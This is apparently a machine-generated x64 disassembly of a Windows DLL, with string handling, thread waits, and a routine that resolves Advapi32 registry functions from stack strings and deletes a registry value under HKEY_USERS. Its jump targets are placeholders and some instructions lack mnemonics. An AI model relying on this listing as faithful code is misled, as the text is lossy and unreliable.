lea rdi [ rbp + 0x210 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x210 ]
lea rcx [ rbp + 0xd0 ]
call sub_180003b50
nop
mov rax [ r14 ]
test r12d r12d
setne r9b
mov r8d [ rax + 0xc ]
lea rdx [ rbp + 0xd0 ]
mov rcx rbx
call sub_180011540
nop
cmp [ rbp + 0xe8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x148 ]
call j_sub_18001c80c
mov [ rbp + 0x200 ] 0x7
mov [ rbp + 0x1f8 ] r15
mov [ rbp + 0x1e8 ] r15w
mov [ rbp - 0x8 ] 0x7
mov [ rbp - 0x10 ] r15
mov [ rbp - 0x20 ] r15w
xor eax eax
mov rcx r13
lea rdi [ rbp + 0x210 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x210 ]
lea rcx [ rbp - 0x20 ]
call sub_180003b50
nop
mov rax [ r14 ]
test r12d r12d
setne r9b
mov r8d [ rax + 0xc ]
lea rdx [ rbp - 0x20 ]
mov rcx rbx
call sub_180011540
nop
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e8 ]
call j_sub_18001c80c
mov [ rsp + 0x20 ] rdi
mov r9d esi
mov r8 rax
mov edx 0x104
lea rcx [ rbp + 0x210 ]
call sub_18001d620
cmp [ rbp + 0x1b0 ] 0x8
jb r-xdata
mov rax [ rax ]
mov [ rbp + 0x138 ] 0x7
mov [ rbp + 0x130 ] r15
mov [ rbp + 0x120 ] r15w
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] r15
mov [ rbp + 0x30 ] r15w
xor eax eax
mov rcx r13
lea rdi [ rbp + 0x210 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x210 ]
lea rcx [ rbp + 0x30 ]
call sub_180003b50
nop
mov rax [ r14 ]
test esi esi
setg r9b
mov r8d [ rax + 0xc ]
lea rdx [ rbp + 0x30 ]
mov rcx rbx
call sub_180011540
nop
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x120 ]
call j_sub_18001c80c
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov [ rbp + 0x188 ] 0x7
mov [ rbp + 0x180 ] r15
mov [ rbp + 0x170 ] r15w
mov [ rbp + 0x98 ] 0x7
mov [ rbp + 0x90 ] r15
mov [ rbp + 0x80 ] r15w
xor eax eax
mov rcx r13
lea rdi [ rbp + 0x210 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x210 ]
lea rcx [ rbp + 0x80 ]
call sub_180003b50
nop
mov rax [ r14 ]
test r12d r12d
setne r9b
mov r8d [ rax + 0xc ]
lea rdx [ rbp + 0x80 ]
mov rcx rbx
call sub_180011540
nop
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x170 ]
call j_sub_18001c80c
mov [ rbp + 0x1d8 ] 0x7
mov [ rbp + 0x1d0 ] r15
mov [ rbp + 0x1c0 ] r15w
mov [ rbp + 0x70 ] 0x7
mov [ rbp + 0x68 ] r15
mov [ rbp + 0x58 ] r15w
xor eax eax
mov rcx r13
lea rdi [ rbp + 0x210 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x210 ]
lea rcx [ rbp + 0x58 ]
call sub_180003b50
nop
mov rax [ r14 ]
test esi esi
setne r9b
mov r8d [ rax + 0xc ]
lea rdx [ rbp + 0x58 ]
mov rcx rbx
call sub_180011540
nop
cmp [ rbp + 0x70 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1c0 ]
call j_sub_18001c80c
mov rcx [ rbp + 0xa8 ]
call j_sub_18001c80c
jmp r-xdata
mov rcx [ rbp + 0xd0 ]
call j_sub_18001c80c
jmp r-xdata
mov rcx [ rbp - 0x20 ]
call j_sub_18001c80c
jmp r-xdata
mov [ rbp + 0x1b0 ] 0x7
mov [ rbp + 0x1a8 ] r15
mov [ rbp + 0x198 ] r15w
mov [ rbp + 0x20 ] 0x7
mov [ rbp + 0x18 ] r15
mov [ rbp + 0x8 ] r15w
xor eax eax
mov rcx r13
lea rdi [ rbp + 0x210 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x210 ]
lea rcx [ rbp + 0x8 ]
call sub_180003b50
nop
mov rax [ r14 ]
test esi esi
setne r9b
mov r8d [ rax + 0xc ]
lea rdx [ rbp + 0x8 ]
mov rcx rbx
call sub_180011540
nop
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x198 ]
call j_sub_18001c80c
mov rcx [ rbp + 0x30 ]
call j_sub_18001c80c
jmp r-xdata
mov rcx [ rbp + 0x80 ]
call j_sub_18001c80c
jmp r-xdata
mov rcx [ rbp + 0x58 ]
call j_sub_18001c80c
jmp r-xdata
mov rcx [ rbp + 0x8 ]
call j_sub_18001c80c
jmp r-xdata
sub_1800100a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rdx ]
mov rdi rdx
mov rbx rcx
mov [ rcx ] rax
movzx eax [ rdx + 0x8 ]
mov [ rcx + 0x8 ] ax
movzx eax [ rdx + 0xa ]
mov [ rcx + 0xa ] al
mov eax [ rdx + 0xc ]
mov [ rcx + 0xc ] eax
movzx eax [ rdx + 0x10 ]
mov [ rcx + 0x10 ] al
movzx eax [ rdx + 0x11 ]
mov [ rcx + 0x11 ] al
cmp [ rdx + 0x18 ] 0x0
je r-xdata
mov rsi [ rsp + 0x38 ]
xor eax eax
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x20 ] rax
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rsi [ rdx + 0x20 ]
test rsi rsi
je r-xdata
mov [ rcx + 0x20 ] rsi
mov edx 0x1
mov rcx rsi
call sub_18001d210
mov rdx rsi
mov [ rbx + 0x18 ] rax
mov r9 [ rdi + 0x20 ]
mov r8 [ rdi + 0x18 ]
mov rcx rax
call sub_18001d25c
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180010180
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
mov ecx 0x28
movzx esi r8b
mov rbp rdx
call sub_18001c84c
xor r9d r9d
mov rbx rax
test rax rax
je r-xdata
mov rbx r9
mov [ rax ] r9
mov eax 0xffff
mov [ rbx + 0xa ] 0xff
mov [ rbx + 0x8 ] ax
movzx eax [ rw-data ]
mov [ rbx + 0xc ] r9d
mov [ rbx + 0x10 ] r9b
mov [ rbx + 0x18 ] r9
mov [ rbx + 0x20 ] r9
mov [ rbx + 0x11 ] al
jmp r-xdata
mov edx 0x1
lea ecx [ rdx + 0x7 ]
call sub_18001d210
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rbp * 8 ]
mov rsi rax
call sub_180013310
mov [ rsi ] rax
cmp [ rbx + 0x18 ] 0x0
jne r-xdata
dec ecx
je r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x18 ]
movzx ecx sil
mov [ rbx + 0xa ] sil
sub ecx 0x33
mov [ rbx + 0x8 ] ax
je r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
movzx ecx [ rw-data ]
mov [ rbx + 0x11 ] cl
mov edx 0x1
lea ecx [ rdx + 0x1 ]
call sub_18001d210
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rbp * 8 ]
mov rsi rax
call sub_180013350
mov [ rsi ] ax
cmp [ rbx + 0x18 ] 0x0
jne r-xdata
dec ecx
je r-xdata
movzx eax [ rw-data ]
mov [ rbx + 0x20 ] 0x2
mov [ rbx + 0x11 ] al
jmp r-xdata
mov edx 0x1
lea ecx [ rdx + 0x7 ]
call sub_18001d210
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rbp * 8 ]
mov rsi rax
call sub_1800133b0
mov [ rsi ] rax
cmp [ rbx + 0x18 ] 0x0
jne r-xdata
dec ecx
jne r-xdata
mov [ rbx + 0x18 ] rsi
movzx eax [ rw-data ]
mov [ rbx + 0x11 ] al
jmp r-xdata
mov [ rbx + 0x20 ] 0x8
sub_1800102e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
movzx esi dx
mov rdi rcx
test dx dx
je r-xdata
or eax 0xffffffff
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx + 0xb8 ]
xor ebx ebx
sub rax [ rcx + 0xb0 ]
sar rax 0x3
test rax rax
je r-xdata
nop [ rax + rax ] ax
mov rsi [ rsp + 0x38 ]
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi + 0xb8 ]
inc rbx
sub rax [ rdi + 0xb0 ]
sar rax 0x3
cmp rbx rax
jb r-xdata
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rbx * 8 ]
call sub_180013350
cmp ax si
je r-xdata
sub_180010380
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800102e0
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rbx + 0xb0 ]
mov [ rsp + 0x30 ] rdi
movsxd rdi eax
mov rcx [ rcx + rdi * 8 ]
call sub_1800133d0
test al al
jne r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov eax 0x1
mov rdi [ rsp + 0x30 ]
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0xb0 ]
mov dl 0x1
mov rcx [ rcx + rdi * 8 ]
call sub_1800133c0
mov rcx [ rbx + 0xb0 ]
mov dl 0x33
mov rcx [ rcx + rdi * 8 ]
call sub_180013380
sub_1800103f0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800102e0
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rbx + 0xb0 ]
mov [ rsp + 0x30 ] rdi
movsxd rdi eax
mov rcx [ rcx + rdi * 8 ]
call sub_1800133d0
test al al
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov eax 0x1
mov rdi [ rsp + 0x30 ]
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0xb0 ]
xor edx edx
mov rcx [ rcx + rdi * 8 ]
call sub_1800133c0
mov rcx [ rbx + 0xb0 ]
mov dl 0x34
mov rcx [ rcx + rdi * 8 ]
call sub_180013380
sub_180010460
push rbp
push rbx
push rdi
push r13
lea rbp [ rsp - 0x3f ]
sub rsp 0xa8
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f ] rax
mov rbx rcx
lea rcx [ rbp + 0xf ]
xor edi edi
mov r13d edx
mov [ rbp + 0xf ] 0x61766441
mov [ rbp + 0x13 ] 0x32336970
mov [ rbp + 0x17 ] 0x6c6c642e
mov [ rbp + 0x1b ] dil
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
lea rdx [ rbp + 0x1f ]
mov rcx rax
mov [ rbp + 0x1f ] 0x4f676552
mov [ rbp + 0x23 ] 0x4b6e6570
mov [ rbp + 0x27 ] 0x78457965
mov [ rbp + 0x2b ] 0x57
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
lea rcx [ rbp + 0xf ]
call [ LoadLibraryA@IAT ]
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
lea rdx [ rbx + 0xd0 ]
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2f ]
xor rcx rsp
call sub_18001d1f0
add rsp 0xa8
pop r13
pop rdi
pop rbx
pop rbp
retn
lea rcx [ rbp - 0x9 ]
mov r9d 0x3
xor r8d r8d
mov [ rsp + 0x20 ] rcx
mov rcx 0xffffffff80000003
call rax
test eax eax
jne r-xdata
mov rdx [ rdx ]
mov rcx [ rbp - 0x9 ]
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x50 ] rdi
mov [ rsp + 0x48 ] rdi
lea rax [ rbp + 0xb ]
xor r9d r9d
mov [ rsp + 0x40 ] rax
lea rax [ rbp - 0x1 ]
xor r8d r8d
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rdi
xor edx edx
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] rdi
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
mov [ rsp + 0xd8 ] rsi
mov [ rsp + 0xe0 ] r12
mov [ rsp + 0xa0 ] r14
mov r14d [ rbp + 0xb ]
inc r14d
mov r12d r14d
add r12 r12
mov rcx r12
call sub_18001d820
mov ebx edi
mov rsi rax
cmp [ rbp - 0x1 ] ebx
jbe r-xdata
mov rcx [ rbp - 0x9 ]
call [ RegCloseKey@IAT ]
mov rcx rsi
call sub_18001c80c
mov rcx [ rbp - 0x9 ]
call [ RegCloseKey@IAT ]
mov r14 [ rsp + 0xa0 ]
mov r12 [ rsp + 0xe0 ]
mov rsi [ rsp + 0xd8 ]
mov eax edi
mov r8 r12
xor edx edx
mov rcx rsi
call sub_18001c9f0
mov rcx [ rbp - 0x9 ]
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rdi
lea r9 [ rbp + 0x7 ]
mov r8 rsi
mov edx ebx
mov [ rsp + 0x28 ] rdi
mov [ rbp + 0x7 ] r14d
mov [ rsp + 0x20 ] rdi
call [ RegEnumValueW@IAT ]
test eax eax
jne r-xdata
inc ebx
cmp ebx [ rbp - 0x1 ]
jb r-xdata
lea r8 [ rbp + 0x3 ]
lea rdx [ r--data ]
mov rcx rsi
call sub_18001d7e8
cmp [ rbp + 0x3 ] r13d
jne r-xdata
jmp r-xdata
mov rcx [ rbp - 0x9 ]
mov rdx rsi
call [ RegDeleteValueW@IAT ]
test eax eax
je r-xdata
mov edi 0x1
sub_180010670
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rax [ rcx ]
cmp [ rax + 0x20 ] 0x4
je r-xdata
mov rax [ rax + 0x18 ]
movzx esi [ rax ]
mov rbx [ rcx + 0x8 ]
test rbx rbx
je r-xdata
mov rbx [ rcx + 0x8 ]
test rbx rbx
je r-xdata
movzx eax si
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
xor eax eax
jmp r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rdx [ rbx ]
mov rcx rbx
call [ rdx ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rdx [ rbx ]
mov rcx rbx
call [ rdx + 0x8 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_180010730
push rsi
push rdi
sub rsp 0x28
mov rdi rdx
mov rdx [ rcx + 0x10 ]
mov rsi rcx
mov rcx 0xfffffffffffffff
mov rax rcx
sub rax rdx
cmp rax rdi
jae r-xdata
mov [ rsp + 0x40 ] rbx
mov r8d 0x8
mov [ rsp + 0x48 ] rbp
mov rax rdx
mov [ rsp + 0x58 ] r13
mov [ rsp + 0x20 ] r14
shr rax 0x1
cmp rax r8
cmovb rax r8
cmp rdi rax
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rbp [ rsi + 0x18 ]
lea rcx [ rsi + 0x29 ]
add rdx rdi
shr rbp 0x1
call sub_180005340
mov rcx [ rsi + 0x8 ]
mov rbx [ rsi + 0x10 ]
lea r13 [ rbp * 8 ]
mov r14 rax
lea rdx [ r13 + rcx ]
shl rbx 0x3
sub rbx rdx
add rbx rcx
lea rcx [ r13 + rax ]
and rbx 0xfffffffffffffff8
mov r8 rbx
call sub_18001c4a0
mov rdx [ rsi + 0x8 ]
add rax rbx
mov rcx rax
cmp rbp rdi
ja r-xdata
sub rcx rax
cmp rdx rcx
cmovbe rdi rax
lea rbx [ rdi * 8 ]
mov r8 rbx
and r8 0xfffffffffffffff8
call sub_18001c4a0
mov r11 [ rsi + 0x8 ]
mov rcx r14
lea rdx [ rbx + r11 ]
sub r13 rdx
add r13 r11
sar r13 0x3
lea rbx [ r13 * 8 ]
mov r8 rbx
call sub_18001c4a0
add rax rbx
test rdi rdi
je r-xdata
sar r13 0x3
mov [ rsp + 0x50 ] r12
mov r12 rdi
lea rbx [ r13 * 8 ]
mov r8 rbx
call sub_18001c4a0
add rax rbx
sub r12 rbp
je r-xdata
mov rcx [ rsi + 0x8 ]
mov r13 [ rsp + 0x58 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
mov r8 rdi
mov rcx rax
shl r8 0x3
mov r12 [ rsp + 0x50 ]
test rbp rbp
je r-xdata
shl r12 0x3
xor edx edx
mov rcx rax
mov r8 r12
call sub_18001c9f0
add [ rsi + 0x10 ] rdi
mov [ rsi + 0x8 ] r14
mov r14 [ rsp + 0x20 ]
add rsp 0x28
pop rdi
pop rsi
retn
call j_sub_18001c80c
shl rbp 0x3
mov rcx r14
mov r8 rbp
jmp r-xdata
xor edx edx
call sub_18001c9f0
sub_1800108c0
push rdi
sub rsp 0x20
mov rdi rcx
call sub_1800102e0
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rdi + 0xb0 ]
mov [ rsp + 0x40 ] rsi
movsxd rsi eax
mov rcx [ rcx + rsi * 8 ]
call sub_1800133d0
test al al
jne r-xdata
xor eax eax
add rsp 0x20
pop rdi
retn
xor eax eax
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rdi + 0xb0 ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
mov rcx [ rcx + rsi * 8 ]
call sub_180013310
mov rcx rax
mov rdx [ rax ]
call [ rdx + 0x58 ]
test al al
jne r-xdata
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rsi * 8 ]
call sub_180013310
mov rcx rax
mov rdx [ rax ]
call [ rdx + 0x50 ]
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rsi * 8 ]
call sub_180013370
mov edx 0x2710
mov rcx rax
call [ WaitForSingleObject@IAT ]
mov rcx [ rdi + 0xb0 ]
mov rbx [ rdi ]
mov rcx [ rcx + rsi * 8 ]
call sub_180013330
mov rcx rdi
mov rdx rax
call [ rbx + 0x70 ]
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rsi * 8 ]
call sub_180013310
test rax rax
je r-xdata
mov ecx 0x64
call [ Sleep@IAT ]
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rsi * 8 ]
call sub_180013310
mov rcx rax
mov rdx [ rax ]
call [ rdx + 0x58 ]
test al al
je r-xdata
lea rcx [ rdi + 0x198 ]
call sub_18001c2b4
mov r11 [ rdi + 0xb0 ]
mov rbx [ r11 + rsi * 8 ]
test rbx rbx
je r-xdata
mov r8 [ rax ]
mov edx 0x1
mov rcx rax
call [ r8 ]
mov rax [ rdi + 0xb0 ]
mov r8 [ rdi + 0xb8 ]
lea rcx [ rax + rsi * 8 ]
lea rdx [ rcx + 0x8 ]
sub r8 rdx
and r8 0xfffffffffffffff8
call sub_18001c4a0
add [ rdi + 0xb8 ] 0xfffffffffffffff8
lea rcx [ rdi + 0x198 ]
call sub_18001c2bc
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x40 ]
mov eax 0x1
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_1800132f0
mov rcx rbx
call j_sub_18001c80c
sub_180010a50
push rdi
sub rsp 0x20
mov rdi rcx
call sub_1800102e0
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rdi + 0xb0 ]
mov [ rsp + 0x40 ] rsi
movsxd rsi eax
mov rcx [ rcx + rsi * 8 ]
call sub_1800133b0
mov rcx rax
mov rdx [ rax ]
call [ rdx + 0x40 ]
test al al
je r-xdata
xor eax eax
add rsp 0x20
pop rdi
retn
mov rcx [ rdi + 0xb0 ]
xor edx edx
mov [ rsp + 0x30 ] rbx
mov rcx [ rcx + rsi * 8 ]
mov [ rsp + 0x38 ] rbp
call sub_1800133c0
mov rcx [ rdi + 0xb0 ]
mov dl 0x36
mov rcx [ rcx + rsi * 8 ]
call sub_180013380
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rsi * 8 ]
call sub_180013390
test al al
je r-xdata
or eax 0xffffffff
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rdi + 0xb0 ]
mov rbx [ rdi ]
mov rcx [ rcx + rsi * 8 ]
call sub_180013330
mov rcx rdi
mov rdx rax
call [ rbx + 0x70 ]
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rsi * 8 ]
call sub_1800133b0
test rax rax
je r-xdata
mov ecx 0x64
call [ Sleep@IAT ]
mov rcx [ rdi + 0xb0 ]
mov rcx [ rcx + rsi * 8 ]
call sub_180013390
test al al
jne r-xdata
lea rcx [ rdi + 0x198 ]
call sub_18001c2b4
mov r11 [ rdi + 0xb0 ]
mov rbx [ r11 + rsi * 8 ]
test rbx rbx
je r-xdata
mov r8 [ rax ]
mov edx 0x1
mov rcx rax
call [ r8 ]
mov rax [ rdi + 0xb0 ]
mov r8 [ rdi + 0xb8 ]
lea rcx [ rax + rsi * 8 ]
lea rdx [ rcx + 0x8 ]
sub r8 rdx
and r8 0xfffffffffffffff8
call sub_18001c4a0
add [ rdi + 0xb8 ] 0xfffffffffffffff8
lea rcx [ rdi + 0x198 ]
call sub_18001c2bc
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x40 ]
mov eax 0x1
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_1800132f0
mov rcx rbx
call j_sub_18001c80c
sub_180010bc0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x40
mov rbx rcx
mov rcx [ rcx + 0x20 ]
mov rbp rdx
movzx eax cl
add al [ rbx + 0x18 ]
test al 0x1
jne r-xdata
mov rsi [ rbx + 0x18 ]
mov rax [ rbx + 0x10 ]
add rsi [ rbx + 0x20 ]
mov rdi rsi
shr rdi 0x1
cmp rax rdi
ja r-xdata
lea rax [ rcx + 0x2 ]
shr rax 0x1
cmp [ rbx + 0x10 ] rax
ja r-xdata
mov rax [ rbx + 0x8 ]
cmp [ rax + rdi * 8 ] 0x0
jne r-xdata
sub rdi rax
mov edx 0x1
mov rcx rbx
call sub_180010730
mov rax [ rbx + 0x8 ]
and esi 0x1
mov rax [ rax + rdi * 8 ]
lea rcx [ rax + rsi * 8 ]
test rcx rcx
je r-xdata
mov ecx 0x10
call sub_18001c84c
test rax rax
je r-xdata
inc [ rbx + 0x20 ]
mov rbp [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rbx [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rax [ rbp ]
mov [ rcx ] rax
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] 0x0
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
mov rcx [ rbx + 0x8 ]
mov [ rcx + rdi * 8 ] rax
sub_180010cb0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x20 ]
xor esi esi
mov rbx rcx
test rax rax
je r-xdata
mov rdi [ rcx + 0x10 ]
test rdi rdi
je r-xdata
nop [ rax ] eax
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
dec rdi
cmp [ rcx + rdi * 8 ] rsi
je r-xdata
cmp [ rcx + 0x20 ] rsi
jne r-xdata
dec rax
mov [ rcx + 0x20 ] rax
jne r-xdata
mov [ rbx + 0x8 ] rsi
mov [ rbx + 0x10 ] rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call j_sub_18001c80c
test rdi rdi
jne r-xdata
mov rcx [ rcx + rdi * 8 ]
call j_sub_18001c80c
test rax rax
je r-xdata
mov [ rcx + 0x18 ] rsi
sub_180010d40
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push r12
sub rsp 0x20
or rax 0xffffffffffffffff
movzx r12d r8w
mov r8 [ rcx + 0x10 ]
sub rax r8
mov rbp rdx
mov rbx rcx
cmp rax rdx
ja r-xdata
mov [ rsp + 0x30 ] rsi
test rdx rdx
je r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rsi [ rsp + 0x30 ]
mov rbp [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
lea rsi [ r8 + rdx ]
mov rax 0x7ffffffffffffffe
cmp rsi rax
jbe r-xdata
mov rcx [ rcx + 0x18 ]
cmp rcx rsi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
test rsi rsi
jne r-xdata
mov rdx rsi
mov rcx rbx
call sub_180001330
test rsi rsi
je r-xdata
mov rcx [ rbx + 0x10 ]
cmp rbp 0x1
jne r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
mov [ rsp + 0x38 ] rdi
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + rcx * 2 ] r12w
jmp r-xdata
mov rax [ rbx ]
mov [ rax + rcx * 2 ] r12w
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rdi [ rax + rcx * 2 ]
movzx eax r12w
mov rcx rbp
[ rdi ]
mov rdi [ rsp + 0x38 ]
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rsi
jb r-xdata
xor eax eax
mov [ rcx + rsi * 2 ] ax
sub_180010e70
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov r8 [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
mov r9 [ rcx + 0x18 ]
cmp r9 0x8
jb r-xdata
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rdi [ r8 + rbp ]
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
cmp r9 0x8
jb r-xdata
cmp rdx rax
jb r-xdata
mov rcx [ rbx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rax [ rbx + 0x10 ]
lea rcx [ rcx + rax * 2 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001330
test rdi rdi
je r-xdata
cmp r9 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
sub rsi rax
mov r9 r8
mov rdx rbx
sar rsi 0x1
mov rcx rbx
mov r8 rsi
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
jmp sub_18000c2e0
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x10 ]
lea r8 [ rbp + rbp ]
mov rdx rsi
lea rcx [ rcx + rax * 2 ]
call sub_18001c4a0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor eax eax
mov [ rcx + rdi * 2 ] ax
sub_180010fd0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rax [ rcx + 0x8 ]
mov rdi rdx
mov rbx rcx
cmp rdx rax
jae r-xdata
cmp rax [ rbx + 0x10 ]
jne r-xdata
mov rcx [ rcx ]
cmp rcx rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180003cb0
sub rdi rcx
sar rdi 0x3
cmp rax [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x8
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi ]
mov [ rcx ] rax
mov rdx [ rbx + 0x8 ]
test rdx rdx
je r-xdata
